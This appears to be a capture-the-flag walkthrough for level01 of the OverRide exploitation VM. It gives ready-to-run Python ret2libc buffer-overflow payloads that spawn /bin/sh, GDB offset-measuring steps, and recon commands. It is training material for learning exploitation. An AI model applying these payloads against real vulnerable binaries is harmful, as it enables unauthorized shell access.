# Level01 — commands

## Python on the VM (read this first)

Many OverRide VMs only have **Python 2** (`python` or `python2`), not **`python3`**. Check:

```bash
which python python2 python3 2>/dev/null
```

- Use the interpreter that exists.
- **Python 2** has no `sys.stdout.buffer`; use **`sys.stdout.write(...)`** with binary strings.
- The template below uses **integer literals** for `OFF`, `SYSTEM`, `EXIT`, `BINSH` — replace them with **your GDB values** (not the names `OFF` / `SYSTEM` as bare identifiers in a one-liner unless you define them).

## Exploit (template — fill numeric values from GDB on the VM)

Purpose: second line overflows the password buffer; first line must be `dat_wil` to reach `fgets` for the password.

**Python 2** (typical on lab VM):

```bash
( python -c "
import struct, sys
OFF = 80
SYSTEM = 0xb7ec60c0
EXIT = 0xb7e5a050
BINSH = 0xb7f89768
pad = 'A' * (OFF - 5)
payload = 'dat_wil\n' + 'admin' + pad + struct.pack('<III', SYSTEM, EXIT, BINSH) + '\n'
sys.stdout.write(payload)
" ) | ./level01
```

Replace **`OFF`**, **`SYSTEM`**, **`EXIT`**, **`BINSH`** with addresses from **your** GDB session (the numbers above are **placeholders only**).

**Python 3** (if installed):

```bash
( python3 -c "
import struct, sys
OFF = 80
SYSTEM = 0xb7ec60c0
EXIT = 0xb7e5a050
BINSH = 0xb7f89768
pad = b'A' * (OFF - 5)
payload = b'dat_wil\n' + b'admin' + pad + struct.pack('<III', SYSTEM, EXIT, BINSH) + b'\n'
sys.stdout.buffer.write(payload)
" ) | ./level01
```

**Without Python** (payload in a file from your host, then `scp` to the VM):

```bash
# After creating /tmp/payload.bin with exact bytes (e.g. from a script on your machine):
cat /tmp/payload.bin | ./level01
```

Purpose:
- Pipe a two-line stdin: valid username, then crafted password line starting with `admin` + padding + ret2libc frame.

**If the command fails before Python runs:** the VM has no `python3` — switch to `python` / `python2` or a file-based payload. **If Python was missing, the pipe often sent nothing or wrong data to `./level01`**, which yields *incorrect username* (first line not `dat_wil`).

---

## GDB — measure offset (pattern)

```bash
gdb -q ./level01
```

```gdb
break *0x08048579
run
```

Input:

```text
dat_wil
< PATTERN_OR_ASCII_CYCLE >
```

After crash (or second run with breakpoint):

```gdb
info registers eip
x/wx $esp
```

Use your pattern tool offset for `$eip` (PEDA `pattern_offset`, GEF `pattern search`, etc.).

Purpose:
- Turn a crash into a numeric **OFF** for the template above.

---

## Recon (binary on VM)

```bash
strings ./level01 | grep -E '^admin$|^dat_wil$'
readelf -s ./level01 | head
ldd ./level01
```

Purpose:
- Confirm reference strings; locate **libc** path for `system` / `/bin/sh` resolution in GDB.
